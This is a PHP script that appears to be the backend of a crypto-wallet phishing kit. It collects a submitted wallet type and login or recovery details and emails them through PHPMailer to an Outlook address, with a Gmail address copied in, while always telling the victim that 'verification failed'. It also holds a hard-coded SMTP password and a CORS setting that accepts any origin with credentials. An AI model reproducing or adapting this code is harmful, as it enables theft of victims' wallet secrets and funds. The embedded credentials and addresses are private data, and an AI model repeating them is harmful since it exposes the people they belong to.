<?php

header('Content-Type: application/json');
header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Max-Age: 86400');
        
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$body = $_POST['body'];
$wallet = $_POST['wallet'];
$msg = $wallet . ' is the wallet type with your verified login details: <br /> <br /> ' . $body;

$mail = new PHPMailer(true);
try {
    //Server settings
    $mail->SMTPDebug = 0;                      //Enable verbose debug output
    $mail->isSMTP();                                            //Send using SMTP
    $mail->Host       = 'urbancube.net';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = 'support@urbancube.net';                     //SMTP username
    $mail->Password   = 'UrbanCube2023';                               //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('support@urbancube.net', '0xswift Server');
    $mail->addAddress('Newfutminnaproject@outlook.com');     //Add a recipient
    $mail->addBcc('olajesujuwon@gmail.com');     //Add a recipient
    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = "0xswift";
    $mail->Body    = $msg;
    // $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    echo json_encode([
        'status' => 'verification failed',
    ]);
} catch (Exception $e) {
    echo json_encode([
        'status' => 'verification failed.',
        [
            $mail->ErrorInfo
        ],
    ]);
    // 'Mailer Error: ' . $mail->ErrorInfo;
}
